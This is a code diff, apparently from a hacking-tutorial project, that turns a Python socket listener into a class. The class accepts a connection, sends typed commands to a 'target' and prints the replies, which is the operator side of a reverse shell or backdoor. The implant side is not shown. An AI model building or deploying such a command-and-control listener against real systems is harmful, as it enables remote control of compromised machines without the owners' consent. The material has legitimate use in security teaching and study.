@@ -20,7 +20,28 @@ def get_arguments():
 
 options = get_arguments()
 
-listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
-listener.bind((options.local_ip, options.port))
-listener.listen()
+
+class Listener:
+    def __init__(self, local_ip, port):
+        listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+        listener.bind((local_ip, port))
+        listener.listen(0)
+        print('[+] Waiting for incoming connections...')
+        self.connection, address = listener.accept()
+        print('[+] Connection from ' + str(address) + '.')
+
+
+    def execute_remotely(self, command):
+        self.connection.send(command)  # sends command to target
+        return self.connection.recv(1024)  # receives in 1024 byte chunks
+
+
+    def run(self):
+        while True:
+            command = raw_input('>> ')
+            result = self.execute_remotely(command)
+            print(result)
+
+
+my_listener = Listener(options.local_ip, options.port)
